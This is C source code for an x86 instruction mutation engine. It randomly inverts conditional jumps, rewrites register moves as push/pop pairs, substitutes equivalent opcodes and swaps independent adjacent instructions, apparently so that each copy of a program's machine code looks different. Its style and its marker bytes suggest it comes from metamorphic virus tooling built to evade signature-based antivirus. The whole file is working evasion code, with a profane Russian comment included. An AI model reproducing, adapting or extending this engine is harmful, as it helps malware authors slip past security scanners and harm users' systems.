
#define MUT_INVJCC
#define MUT_CHANGE
#define MUT_MIX

#ifdef MUT_MIX
int get_args(BYTE*,int*,int*,int);
#endif

void id3() { __emit__( 0xEB,0x02,0xFF,3 ); }

void pascal mutate(hooy* root,
                   DWORD rnd(DWORD),
                   BYTE* user_malloc(DWORD))
{

#ifdef MUT_INVJCC

#ifdef DEBUG_PRINTF
  printf("■ MUTATING - INVERT JCCs\n");
#endif

  for (hooy* h=root; h; h=h->next)      // for each entry
    if (rnd(2))
    if (h->len==6)
    if (( (*(WORD*)&h->cmd)  &0xF0FF)==0x800F)     // find jcc
    {
      h->cmd[1]^=0x01;                  // inverse condition (jz <--> jnz)
      hooy* t = h->rel;                 // exchange nxt & rel pointers
      h->rel = h->nxt;                  //  (following, and label to jmp to)
      h->nxt = t;
    }

#endif
#ifdef MUT_CHANGE

#ifdef DEBUG_PRINTF
  printf("■ MUTATING - CHANGE\n");
#endif

  for (hooy* h=root; h; h=h->next)      // for each entry
  if (h->len==2)
  {
    BYTE b0=h->cmd[0];                  // get opcodes
    BYTE b1=h->cmd[1];

    // 10001001 11xxxyyy     ; mov r1,r2
    // 01010xxx 01011yyy     ; push r2 // pop r1
    // 10001011 11xxxyyy     ; mov r1,r2
    // 01010yyy 01011xxx     ; push r2 // pop r1
    if ((b0&0xFD)==0x89)
    if ((b1&0xC0)==0xC0)
    if (rnd(2))
    {
#ifdef DEBUG_PRINTF
      printf("b");
#endif
      BYTE t=b0;
      b0=0x50|((b1>>(t==0x89?3:0))&7);
      b1=0x58|((b1>>(t==0x89?0:3))&7);
    }

    // 00ttt001 11xxxyyy     ; ttt r1,r2 (ADD,ADC,AND,OR,SUB,SBB,XOR,CMP)
    // 00ttt011 11yyyxxx
    // 10001001 11xxxyyy     ; mov r1,r2
    // 10001011 11yyyxxx
    if ((b1&0xC0)==0xC0)
    if (((b0&0xC4)==0x00)||((b0&0xFC)==0x88))
    if (rnd(2))
    {
#ifdef DEBUG_PRINTF
      printf("a");
#endif
      b0^=0x02;
      b1=0xC0|((b1>>3)&7)|((b1&7)<<3);
    }

    //if (xxx==yyy)
    //001100xx 11xxxyyy     ; xor r1,r1
    //001010xx 11xxxyyy     ; sub r1,r1
    if (((b0&0xFC)==0x30)||((b0&0xFC)==0x28))
    if (((b1&0xC0)==0xC0)&&(((b1>>3)&7)==(b1&7)))
    if (rnd(2))
    {
#ifdef DEBUG_PRINTF
      printf("c");
#endif
      b0^=0x30^0x28;
    }

    //if (xxx==yyy)
    //0000100x 11xxxyyy     ; or r1,r1
    //1000010x 11xxxyyy     ; test r1,r1
    if (((b0&0xFE)==0x08)||((b0&0xFE)==0x84))
    if (((b1&0xC0)==0xC0)&&(((b1>>3)&7)==(b1&7)))
    if (rnd(2))
    {
#ifdef DEBUG_PRINTF
      printf("d");
#endif
      b0^=0x08^0x84;
    }

    h->cmd[0]=b0;                       // store opcodes
    h->cmd[1]=b1;
  }
#ifdef DEBUG_PRINTF
  printf("\n");
#endif

#endif
#ifdef MUT_MIX

#ifdef DEBUG_PRINTF
  printf("■ MUTATING - MIX\n");
#endif

  for (hooy*h0=root,*h1=h0; h0; h1=h0, h0=h0->next)
  {
    /* ... h1 h0 ... */    // if h0->nxt is standard cmd
    if (!(h1->flags&(CM_XREF)))
    if (!(h0->flags&(CM_STOP|CM_XREF)))
    if ((h0->nxt)&&(!(h0->nxt->flags&(CM_HAVEREL|CM_STOP|CM_XREF))))
    {
      int r1,r2,r3,r4;
      int n1=get_args(&h0->cmd[0], &r1,&r2, h0->len);
      int n2=get_args(&h1->cmd[0], &r3,&r4, h1->len);
      if (n1 && n2 && (n1+n2<=3))  // both ok, and only 1 may use stack
      if (((r1!=5)&&(r3!=5))||(n1+n2==2)) // check if ESP used
      if ((r1==-1)||(r3==-1)||(r1!=r3))
      if ((r1==-1)||(r4==-1)||(r1!=r4))
      if ((r2==-1)||(r3==-1)||(r2!=r3))
      {
#ifdef DEBUG_PRINTF
//      printf("mix: %02X %02X %02X\n",h1->cmd[0],h1->cmd[1],h1->cmd[2]);
//      printf("     %02X %02X %02X\n",h0->cmd[0],h0->cmd[1],h0->cmd[2]);
        printf("x");
#endif

        for (int i=0; i<MAXCMDLEN; i++) // swap opcodes
        {
          h0->cmd[i]^=h1->cmd[i];
          h1->cmd[i]^=h0->cmd[i];
          h0->cmd[i]^=h1->cmd[i];
        }
        h0->len^=h1->len;               // swap lengths
        h1->len^=h0->len;
        h0->len^=h1->len;

      }

    }
  }
#ifdef DEBUG_PRINTF
  printf("\n");
#endif

#endif

}

#ifdef MUT_MIX

 // calcs arguments for given opcode
 // returns: 2 if stack used, 1 if not,
 // 0 if non-mixable/unknown opcode

int get_args(BYTE* opc, int* d, int* s, int len)
{
  *d=-1;
  *s=-1;

  if ((opc[1]&0xC0)==0xC0)       // modrm: r, r
  if ((opc[1]&7)!=4)             // esp md
  if (((opc[1]>>3)&7)!=4)        // esp md
  {
    if ((opc[0]&0xFD)==0x89)     // mov r, r
    {
      *d=(opc[1]>>3)&7;
      *s=opc[1]&7;
      if (opc[0]&2) { *d^=*s; *s^=*d; *d^=*s; }; // swap
      return 1;
    }
  }

  if ((opc[0]&0xF8)==0x50)       // push r
  if ((opc[0]&7)!=4)             // esp md
  {
    *s=opc[0]&7;
    return 2;                    // 2=stack used
  }
  if ((opc[0]&0xF8)==0x58)       // pop r
  if ((opc[0]&7)!=4)             // esp md
  {
    *d=opc[0]&7;
    return 2;                    // 2=stack used
  }

  if ((opc[0]&0xF8)==0xB8)       // mov r, c
  if ((opc[0]&7)!=4)             // esp md
  {
    *d=opc[0]&7;
    return 1;
  }

  if (len==1) // <<<--- я искал этот сучий глюк месяц!!!
  if ((opc[0]&0xF0)==0x40)       // inc/dec r
  if ((opc[0]&7)!=4)             // esp md
  {
    *s=*d=opc[0]&7;
    return 1;
  }

/* it seems adc/sbb sucks...
  if ((opc[0]==0x83)&&((opc[1]&0xC0)==0xC0)) // ttt r,byte
  if ((opc[1]&7)!=4)             // esp md
  {
    *s=*d=opc[1]&7;
    return 1;
  }
*/

  return 0;
}

#endif

void id4() { __emit__( 0xEB,0x02,0xFF,4 ); }
